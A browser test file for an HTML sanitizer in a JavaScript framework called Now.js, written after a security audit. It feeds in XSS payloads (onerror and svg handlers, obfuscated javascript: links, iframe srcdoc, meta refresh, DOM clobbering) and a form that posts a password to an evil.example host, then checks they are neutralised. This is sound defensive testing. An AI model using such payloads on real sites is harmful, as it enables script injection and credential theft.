/**
 * One sanitizer, two levels (Now.js audit 2026-11-10, phase 1: S1 S6 S8 S9).
 *
 * - Untrusted HTML (data, response actions, table {html} cells, data-html,
 *   dialogs, MediaViewer) gets a narrow allow list, safe inline styles and
 *   iframes from known video hosts only.
 * - Trusted templates (.html from our own origin) keep their markup — style,
 *   <style>, <link>, mailto:/tel:, data:image, relative ../ URLs — and lose
 *   only what runs code: on* handlers, srcdoc, script URLs.
 * - Parsing is inert: no handler may run while markup is being cleaned.
 * - stripTags returns text without running the markup.
 *
 * Runs the real built bundles in a real browser. NOW_DIST overrides the
 * bundle folder (default ../Now/dist).
 */

import http from 'node:http';
import {readFileSync} from 'node:fs';
import puppeteer from '../node_modules/puppeteer-core/lib/puppeteer/puppeteer-core.js';

const here = new URL('.', import.meta.url).pathname;
const DIST = (process.env.NOW_DIST || here + '../Now/dist').replace(/\/?$/, '/');

const page = `<!doctype html>
<html><head><meta charset="utf-8"><title>t</title></head><body>
<div id="main"></div>
<script src="/core.js"></script>
<script src="/table.js"></script>
<script src="/graph.js"></script>
<script>
window.__x = [];
window.__ready = (async () => {
  await Now.init({environment: 'production', allowEval: false, auth: {enabled: false}});
})();
</script>
</body></html>`;

// A trusted template the way apps write them (adminframework templates/403.html,
// gcms forms with action="../api/...", contact links, an inline-styled box).
const template = `<section class="tpl">
<style>.tpl-box{color:red}</style>
<link rel="stylesheet" href="/css/extra.css">
<div class="tpl-box" style="max-width: 420px; --tint: #f00">box</div>
<form action="../api/index/auth/login" method="post" onsubmit="window.__x.push('tpl-onsubmit')"><input name="u"></form>
<a id="mail" href="mailto:admin@example.com">mail</a>
<a id="tel" href="tel:+6621234567">tel</a>
<a id="time" href="/report?t=12:30">time</a>
<a id="js" href="javascript:window.__x.push('tpl-href')">js</a>
<img id="dataimg" src="data:image/png;base64,iVBORw0KGgo=" alt="">
<img id="bad" src="x" onerror="window.__x.push('tpl-onerror')">
<meta http-equiv="refresh" content="0;url=https://evil.example/">
<base href="https://evil.example/">
</section>`;

const server = http.createServer((req, res) => {
  const files = {
    '/': [page, 'text/html'],
    '/core.js': [readFileSync(DIST + 'now.core.min.js', 'utf8'), 'application/javascript'],
    '/table.js': [readFileSync(DIST + 'now.table.min.js', 'utf8'), 'application/javascript'],
    '/graph.js': [readFileSync(DIST + 'now.graph.min.js', 'utf8'), 'application/javascript'],
    '/t/page.html': [template, 'text/html']
  };
  const file = files[req.url];
  if (!file) {
    res.writeHead(204);
    return res.end();
  }
  res.writeHead(200, {'Content-Type': `${file[1]}; charset=utf-8`});
  res.end(file[0]);
});
await new Promise(r => server.listen(0, '127.0.0.1', r));
const origin = `http://127.0.0.1:${server.address().port}`;

const browser = await puppeteer.launch({executablePath: '/usr/bin/google-chrome', headless: 'new', args: ['--no-sandbox', '--disable-dev-shm-usage']});
const tab = await browser.newPage();
const errors = [];
tab.on('pageerror', e => errors.push(String(e)));
tab.on('dialog', d => {
  errors.push('DIALOG:' + d.message());
  d.dismiss();
});
await tab.goto(origin + '/', {waitUntil: 'networkidle0'});
await tab.evaluate(() => window.__ready);

const results = [];
const check = (name, pass, detail) => {
  results.push(pass);
  console.log(`${pass ? '  ✔' : '  ✘'} ${name}${!pass && detail !== undefined ? '  — ' + detail : ''}`);
};

// --- Untrusted: the audit payloads (probe p1) -------------------------------
const untrusted = await tab.evaluate(async () => {
  const cases = {
    onerror: '<img src="x" onerror="window.__x.push(\'onerror\')">',
    jsHref: '<a href="javascript:window.__x.push(1)">a</a>',
    tabHref: '<a href="java\tscript:window.__x.push(2)">a</a>',
    entityHref: '<a href="&#106;avascript:window.__x.push(3)">a</a>',
    script: '<script>window.__x.push("script")<\/script><b>ok</b>',
    svg: '<svg onload="window.__x.push(\'svgonload\')"><a xlink:href="javascript:1">x</a></svg>',
    iframe: '<iframe src="javascript:parent.__x.push(\'iframe\')"></iframe><iframe srcdoc="<script>parent.__x.push(\'srcdoc\')<\/script>"></iframe>',
    style: '<style>body{background:url(//evil.example/x)}</style><p style="position:fixed">p</p>',
    meta: '<meta http-equiv="refresh" content="0;url=https://evil.example/">',
    form: '<form action="https://evil.example/steal"><input name="password"><button formaction="https://evil.example/2">go</button></form>',
    details: '<details ontoggle="window.__x.push(\'toggle\')" open>d</details>',
    clobber: '<img name="getElementById" src="/a.png"><b id="SecurityManager">s</b><i id="addEventListener">a</i><u id="cookie">c</u>'
  };
  const out = {};
  for (const [k, html] of Object.entries(cases)) out[k] = SecurityManager.sanitizeHtml(html);
  out.plainId = SecurityManager.sanitizeHtml('<a id="good" href="/page">y</a>');

  // End-to-end through a server action
  await ResponseHandler.process({success: true, actions: [{type: 'update', target: '#main', content: cases.onerror + cases.details + cases.iframe}]});
  await new Promise(r => setTimeout(r, 400));
  out.viaResponse = document.getElementById('main').innerHTML;
  out.executed = [...window.__x];
  return out;
});
const bad = /\son[a-z]+=|javascript:|<script|srcdoc|<svg|<style|<meta|<form|<input|<button|position:\s*fixed/i;
for (const [k, v] of Object.entries(untrusted)) {
  if (k === 'executed') continue;
  check(`untrusted ${k}: nothing that runs or escapes the box`, !bad.test(v), v);
}
check('untrusted <script> drops the script and keeps the text around it', untrusted.script === '<b>ok</b>', untrusted.script);
check('untrusted name/id cannot clobber document or window', !/\sname=|\sid=/.test(untrusted.clobber), untrusted.clobber);
check('untrusted keeps an ordinary id', untrusted.plainId === '<a id="good" href="/page">y</a>', untrusted.plainId);
check('no handler ran while untrusted HTML was sanitized or inserted', untrusted.executed.length === 0, JSON.stringify(untrusted.executed));

// --- Untrusted: what real content needs to keep ------------------------------
const keep = await tab.evaluate(() => {
  const s = (html) => SecurityManager.sanitizeHtml(html);
  const div = document.createElement('div');
  const parse = (html) => {
    div.innerHTML = s(html);
    return div.firstElementChild;
  };
  const color = parse('<span style="color: #ff0000; position: fixed; background-image: url(https://evil.example/x)">c</span>');
  const blank = parse('<a href="https://example.com/" target="_blank">x</a>');
  const yt = parse('<iframe src="//www.youtube.com/embed/abc123?wmode=transparent" allowfullscreen></iframe>');
  return {
    color: color.getAttribute('style'),
    mailto: parse('<a href="mailto:a@example.com">m</a>').getAttribute('href'),
    tel: parse('<a href="tel:+6621234567">t</a>').getAttribute('href'),
    colonQuery: parse('<a href="/report?t=12:30">q</a>').getAttribute('href'),
    parent: parse('<a href="../api/migration/jobs/exportmodule?id=1&amp;type=app">p</a>').getAttribute('href'),
    blankRel: blank.getAttribute('rel'),
    dataImg: parse('<img src="data:image/png;base64,iVBORw0KGgo=" alt="">').getAttribute('src'),
    dataHtml: parse('<img src="data:text/html;base64,PHNjcmlwdD4=" alt="">').getAttribute('src'),
    youtube: yt && yt.tagName === 'IFRAME' ? yt.getAttribute('src') : null,
    youtubeSandbox: yt ? yt.getAttribute('sandbox') : null,
    evilFrame: s('<iframe src="https://evil.example/embed/x"></iframe>'),
    table: s('<table border="1"><tr><td colspan="2" style="text-align:center">t</td></tr></table>'),
    font: s('<font color="#00f" face="Tahoma">f</font>'),
    langCell: s('<div class="one_line"><img src="/language/th.gif" alt="th"> topic</div>'),
    styleUrl: s('<p style="background:url(javascript:alert(1))">u</p>')
  };
});
check('untrusted keeps safe inline style and drops the rest', keep.color === 'color: #ff0000', keep.color);
check('untrusted keeps mailto: and tel: links', keep.mailto === 'mailto:a@example.com' && keep.tel === 'tel:+6621234567', `${keep.mailto} ${keep.tel}`);
check('untrusted keeps a colon in the query (?t=12:30)', keep.colonQuery === '/report?t=12:30', keep.colonQuery);
check('untrusted keeps a ../ relative link', keep.parent === '../api/migration/jobs/exportmodule?id=1&type=app', keep.parent);
check('untrusted target=_blank gets rel=noopener', /noopener/.test(keep.blankRel || ''), keep.blankRel);
check('untrusted keeps data:image but not data:text/html', keep.dataImg.startsWith('data:image/png') && !keep.dataHtml, `${keep.dataImg} | ${keep.dataHtml}`);
check('untrusted keeps a YouTube embed, sandboxed', keep.youtube && keep.youtube.includes('youtube.com/embed/abc123') && !!keep.youtubeSandbox, `${keep.youtube} sandbox=${keep.youtubeSandbox}`);
check('untrusted drops an iframe from an unknown host', !/<iframe/i.test(keep.evilFrame), keep.evilFrame);
check('untrusted keeps table markup with colspan and alignment', /<table border="1">/.test(keep.table) && /colspan="2"/.test(keep.table) && /text-align: center/.test(keep.table), keep.table);
check('untrusted keeps <font color face> from the editor', /<font color="#00f" face="Tahoma">f<\/font>/.test(keep.font), keep.font);
check('untrusted keeps class and img src of a server cell', keep.langCell === '<div class="one_line"><img src="/language/th.gif" alt="th"> topic</div>', keep.langCell);
check('untrusted drops a style that carries a script URL', !/javascript|style=/i.test(keep.styleUrl), keep.styleUrl);

// --- Untrusted: the framework paths that insert it --------------------------
const paths = await tab.evaluate(async () => {
  window.__x = [];
  const out = {};
  // data-html (helpdesk BBCode output)
  const host = document.createElement('div');
  host.innerHTML = '<div data-html="detail"></div>';
  document.body.appendChild(host);
  TemplateManager.processTemplate(host, {state: {detail: '<span style="color:red">red</span> <img src=x onerror="window.__x.push(\'data-html\')"><iframe src="//www.youtube.com/embed/v1"></iframe>'}});
  out.dataHtml = host.firstElementChild.innerHTML;
  // Modal and DialogManager share the sanitizer
  const m = new Modal({title: 't', content: ''});
  out.modal = m._sanitizeHTML('<a href="javascript:alert(1)">a</a><img src=x onerror="window.__x.push(\'modal\')">');
  out.dialog = DialogManager._sanitizeHtml('<a href="javascript:alert(1)">a</a><b style="color:blue">b</b>');
  // Table {html} cell
  out.cell = TableManager.sanitizeCellHtml('<a class="btn" href="../api/x?id=1" target="_blank">x</a><img src=x onerror="window.__x.push(\'cell\')">');
  // MediaViewer html item
  const mv = Object.create(MediaViewer.prototype);
  mv.stage = document.createElement('div');
  mv.renderHtml({content: '<p>p</p><img src=x onerror="window.__x.push(\'media\')">'});
  out.media = mv.stage.innerHTML;
  await new Promise(r => setTimeout(r, 400));
  out.executed = [...window.__x];
  host.remove();
  return out;
});
check('data-html keeps BBCode colour and YouTube, drops onerror', /style="color: red"/.test(paths.dataHtml) && /youtube\.com\/embed\/v1/.test(paths.dataHtml) && !/onerror/.test(paths.dataHtml), paths.dataHtml);
check('Modal._sanitizeHTML drops javascript: and on*', !/javascript:|onerror/.test(paths.modal), paths.modal);
check('DialogManager._sanitizeHtml drops javascript: and keeps safe style', !/javascript:/.test(paths.dialog) && /color: blue/.test(paths.dialog), paths.dialog);
check('table {html} cell keeps the link (../, target) and drops onerror', /href="\.\.\/api\/x\?id=1"/.test(paths.cell) && /target="_blank"/.test(paths.cell) && !/onerror/.test(paths.cell), paths.cell);
check('MediaViewer html item drops onerror', /<p>p<\/p>/.test(paths.media) && !/onerror/.test(paths.media), paths.media);
check('no handler ran on the framework insert paths', paths.executed.length === 0, JSON.stringify(paths.executed));

// --- Trusted: a template from our own origin --------------------------------
const trusted = await tab.evaluate(async (url) => {
  window.__x = [];
  TemplateManager.state.cache.clear();
  const html = await TemplateManager.loadFromServer(url);
  const box = document.createElement('div');
  const tpl = document.createElement('template');
  tpl.innerHTML = html;
  box.appendChild(tpl.content);
  await new Promise(r => setTimeout(r, 400));
  const q = (sel) => box.querySelector(sel);
  // A component subtree processed in the live document must keep style too
  const live = document.createElement('div');
  live.innerHTML = '<p style="max-width: 10px" onclick="window.__x.push(\'live\')">x</p>';
  document.body.appendChild(live);
  TemplateManager.processTemplate(live, {state: {}});
  const out = {
    styleTag: !!q('style'),
    link: q('link')?.getAttribute('href') || null,
    boxStyle: q('.tpl-box')?.getAttribute('style') || null,
    formAction: q('form')?.getAttribute('action') || null,
    formOnsubmit: q('form')?.hasAttribute('onsubmit'),
    mail: q('#mail')?.getAttribute('href'),
    tel: q('#tel')?.getAttribute('href'),
    time: q('#time')?.getAttribute('href'),
    js: q('#js')?.getAttribute('href') ?? null,
    dataimg: q('#dataimg')?.getAttribute('src') || '',
    onerror: q('#bad')?.hasAttribute('onerror'),
    metaEquiv: q('meta')?.hasAttribute('http-equiv') || false,
    base: !!q('base'),
    liveStyle: live.firstElementChild.getAttribute('style'),
    liveOnclick: live.firstElementChild.hasAttribute('onclick'),
    executed: [...window.__x]
  };
  live.remove();
  return out;
}, origin + '/t/page.html');
check('trusted template keeps <style> and <link>', trusted.styleTag && trusted.link === '/css/extra.css', JSON.stringify(trusted));
check('trusted template keeps inline style as written (custom properties too)', trusted.boxStyle === 'max-width: 420px; --tint: #f00', trusted.boxStyle);
check('trusted template keeps form action="../api/..."', trusted.formAction === '../api/index/auth/login', trusted.formAction);
check('trusted template keeps mailto:, tel: and ?t=12:30', trusted.mail === 'mailto:admin@example.com' && trusted.tel === 'tel:+6621234567' && trusted.time === '/report?t=12:30', `${trusted.mail} ${trusted.tel} ${trusted.time}`);
check('trusted template keeps data:image', trusted.dataimg.startsWith('data:image/png'), trusted.dataimg);
check('trusted template loses on* handlers', trusted.formOnsubmit === false && trusted.onerror === false, JSON.stringify(trusted));
check('trusted template loses javascript: href', trusted.js === null, trusted.js);
check('trusted template loses meta http-equiv and <base>', trusted.metaEquiv === false && trusted.base === false, JSON.stringify(trusted));
check('component subtree in the live page keeps style and loses onclick', trusted.liveStyle === 'max-width: 10px' && trusted.liveOnclick === false, `${trusted.liveStyle} ${trusted.liveOnclick}`);
check('no template handler ran while the template was loaded', trusted.executed.length === 0, JSON.stringify(trusted.executed));

// --- stripTags ---------------------------------------------------------------
const strip = await tab.evaluate(async () => {
  window.__x = [];
  const a = Utils.string.stripTags('<img src=x onerror="window.__x.push(\'utils\')">hello <b>world</b>');
  const b = GraphRenderer.prototype.stripTags.call({}, '<img src=x onerror="window.__x.push(\'graph\')">label');
  await new Promise(r => setTimeout(r, 400));
  return {a, b, executed: [...window.__x]};
});
check('Utils.string.stripTags returns the text', strip.a === 'hello world', strip.a);
check('GraphRenderer.stripTags returns the text', strip.b === 'label', strip.b);
check('stripTags runs nothing', strip.executed.length === 0, JSON.stringify(strip.executed));

check('no page errors', errors.length === 0, errors.join(' | '));

await browser.close();
server.close();
const failed = results.filter(r => !r).length;
console.log(failed ? `\n${failed} of ${results.length} checks failed` : `\nall ${results.length} checks passed`);
process.exit(failed ? 1 : 0);
